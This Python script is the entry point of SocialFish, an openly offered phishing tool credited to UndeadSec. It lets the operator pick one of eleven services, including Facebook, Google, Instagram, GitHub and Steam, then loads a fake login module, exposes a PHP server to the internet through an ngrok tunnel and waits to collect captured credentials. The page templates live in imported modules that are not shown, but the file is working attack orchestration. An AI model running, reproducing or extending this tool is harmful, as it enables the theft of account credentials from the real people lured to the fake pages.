#!/usr/bin/env python3

######################################################
#                                                    #
#       SOCIALFISH v2.0sharkNet                      #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from sys import exit, version_info

if version_info<(3,0,0):
    print('[!] Please use Python 3. $ python3 SocialFish.py')
    exit(0)

from multiprocessing import Process
from core.view import *
from core.pre import *
from core.phishingRunner import *

if connected() == False:
    conNot()
checkNgrok()
if checkPHP() == False:
    phpNot()
    exit(0)

def main():
    head()
    checkEd()    
    preoption = input(cyan("\n Select an option:\n\n [S] Social Media\n\n [O] Others\n\n SF > "))
    if preoption.upper() == 'S':
        print(cyan('\n Select an option:\n\n [1] Facebook\n\n [2] Google\n\n [3] LinkedIN\n\n [4] Twitter\n\n [5] Instagram\n\n [6] Snapchat\n\n [7] VK'))
    else:
        print(cyan('\n Select an option:\n\n [8] GitHub\n\n [9] StackOverflow\n\n [10] WordPress\n\n [11] Steam'))
    option = input(cyan('\n SF > '))
    if option == '1':
        loadModule('Facebook')
        runPhishing('Facebook')
    elif option == '2':
        loadModule('Google')      
        runPhishing('Google')
    elif option == '3':
        loadModule('LinkedIn')
        runPhishing('LinkedIn')
    elif option == '4':
        loadModule('Twitter')
        runPhishing('Twitter')
    elif option == '5':
        loadModule('Instagram')
        runPhishing('Instagram') 
    elif option == '6':
        loadModule('Snapchat')
        runPhishing('Snapchat')
    elif option == '7':
        loadModule('VK')
        runPhishing('VK')
    elif option == '8':
        loadModule('GitHub')
        runPhishing('GitHub')
    elif option == '9':
        loadModule('StackOverflow')
        runPhishing('StackOverflow')
    elif option == '10':
        loadModule('WordPress')
        runPhishing('WordPress')
    elif option == '11':
        loadModule('Steam')
        runPhishing('Steam')
    else:
        exit(0)

if __name__ == "__main__":
    try:
        main()
        runNgrok()
        Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
